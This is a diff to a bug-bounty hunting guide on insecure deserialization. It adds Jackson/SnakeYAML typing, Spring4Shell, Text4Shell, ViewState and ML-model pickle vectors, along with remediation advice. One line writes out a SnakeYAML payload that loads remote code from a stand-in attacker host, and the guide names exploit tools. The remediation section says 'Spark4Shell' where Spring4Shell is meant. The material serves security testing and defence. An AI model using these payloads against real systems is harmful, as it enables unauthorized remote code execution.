@@ -1,8 +1,11 @@
 ---
 name: hunt-deserialization
-description: Hunt Insecure Deserialization — Java gadget chains (ysoserial), PHP object injection (phpggc), Python pickle RCE, .NET BinaryFormatter, Ruby Marshal.load, JNDI/Log4Shell. RCE via deserialization is almost always Critical. Use when target runs Java, PHP serialization, Python pickle, .NET, or Ruby on Rails.
-sources: hackerone_public
+description: Hunt Insecure Deserialization — Java gadget chains (ysoserial), PHP object injection (phpggc), Python pickle RCE, .NET BinaryFormatter, Ruby Marshal.load, JNDI/Log4Shell, plus modern vectors (Jackson/SnakeYAML polymorphic typing, Spring4Shell, Text4Shell, ML-model pickle). RCE via deserialization is almost always Critical. Use when target runs Java, PHP serialization, Python pickle, .NET, Ruby on Rails, or loads ML model files.
+sources: hackerone_public, cve_database, public_research
 report_count: 22
+cwe: [CWE-502, CWE-917, CWE-94, CWE-470]
+cvss_baseline: "Critical (9.8) unauthenticated RCE — the norm. High (8.1) when authenticated or constrained to blind OOB only. Lower only if no gadget reaches a dangerous sink (prove, don't assume)."
+related_skills: [hunt-rce, hunt-file-upload, hunt-ssti, hunt-llm-ai, hunt-springboot, triage-validation]
 ---
 
 # HUNT-DESERIALIZATION — Insecure Deserialization
@@ -148,6 +151,32 @@ grep -r "Marshal.load\|Marshal.restore" --include="*.rb" .
 
 ---
 
+## New Techniques (2024-2026)
+
+### JSON/YAML polymorphic-typing RCE (the modern dominant vector)
+Binary-serialized blobs are rarer now; the live surface is typed JSON/YAML:
+- **Jackson (FasterXML)** — `enableDefaultTyping()` / `@JsonTypeInfo` lets the attacker pick the concrete class via a `@class`/`@type` field → gadget to JNDI/`JdbcRowSetImpl` → RCE. Look for JSON APIs echoing/accepting a type discriminator.
+- **SnakeYAML CVE-2022-1471** — `yaml.load()` without `SafeConstructor`: `!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker/"]]]]` → remote class load → RCE.
+- **FastJson / Fastjson2** (`@type` autotype) — same idea in the JVM JSON world.
+- **.NET Json.NET** `TypeNameHandling != None` → `$type` gadget → RCE.
+
+### Expression-injection RCE classes often grouped with deser
+- **Spring4Shell CVE-2022-22965** — data-binding to `class.module.classLoader...` on Spring MVC/WebFlux (Tomcat) → webshell.
+- **Text4Shell CVE-2022-42889** — Apache Commons Text `StringSubstitutor` `${script:...}`/`${url:...}`/`${dns:...}` interpolation → RCE/SSRF.
+- Keep **Log4Shell** post-patch bypasses in mind (2.15/2.16 nested-lookup bypasses) when a partially-patched version is detected.
+
+### .NET ViewState with leaked machineKey
+If `__VIEWSTATE` MAC is enabled but the `machineKey` leaks (web.config disclosure, CVE-2020-0688 Exchange static key), sign a ysoserial.net `ViewState` gadget → RCE. Cross-ref `hunt-source-leak`, `hunt-aspnet`.
+
+### ML-model / data-science deserialization (high-value, under-tested)
+AI/ML apps load untrusted model/artifact files that deserialize arbitrary code:
+- **Python pickle** inside `.pkl`, PyTorch `.pt/.bin` (`torch.load`), `joblib`, `numpy.load(allow_pickle=True)`, `pandas.read_pickle` → `__reduce__` RCE on model upload/import.
+- **Keras/TF `Lambda` layers**, **`.pb`/`.h5`** custom objects.
+If the target ingests user-supplied models/datasets (training UI, "import model", notebook), this is a direct RCE surface. Cross-ref `hunt-llm-ai`, `hunt-rag-vector`.
+
+### Detection-first discipline
+Prefer OOB (DNS/HTTP via interactsh) gadgets for *detection* before firing command-exec; many stacks are blind. A DNS callback with a unique subdomain is sufficient Critical PoC without running intrusive commands.
+
 ## Chain Table
 
 | Deserialization signal | Chain to | Impact |
@@ -170,9 +199,24 @@ git clone https://github.com/pimps/JNDI-Exploit-Kit
 
 ---
 
+## Remediation
+
+- Never deserialize untrusted data into code-bearing object graphs. Use data-only formats with safe parsers (`yaml.safe_load`, Jackson default typing OFF, Json.NET `TypeNameHandling.None`, JSON over native serialization).
+- For pickle/Marshal/BinaryFormatter: avoid entirely for untrusted input; if unavoidable, use allowlist `ObjectInputFilter` (Java), signed+encrypted blobs, or safetensors instead of pickle for ML models.
+- Patch and pin: Log4j ≥2.17.1, SnakeYAML ≥2.0, Spring/Tomcat for Spark4Shell, Commons-Text ≥1.10.
+- Isolate workers that must load models/archives (no internal network, no cloud metadata, least privilege).
+
 ## Validation
 
 ✅ DNS/HTTP callback from COLLAB host: blind deserialization confirmed
 ✅ Command output in response: full RCE confirmed
 
 **Severity:** Almost always **Critical** — RCE with server process privileges.
+
+## Disclosed Report Patterns
+
+Verify before quoting IDs/amounts.
+- **Java gadget chain via serialized cookie/parameter → RCE** (CommonsCollections, Shiro default key) — canonical critical.
+- **SnakeYAML/Jackson polymorphic typing → RCE** — the common modern JVM disclosure.
+- **PHP phar:// deserialization via fs sink** — RCE with no `unserialize()` in code.
+- **ML-model pickle RCE on import** — emerging high-value class in AI products.
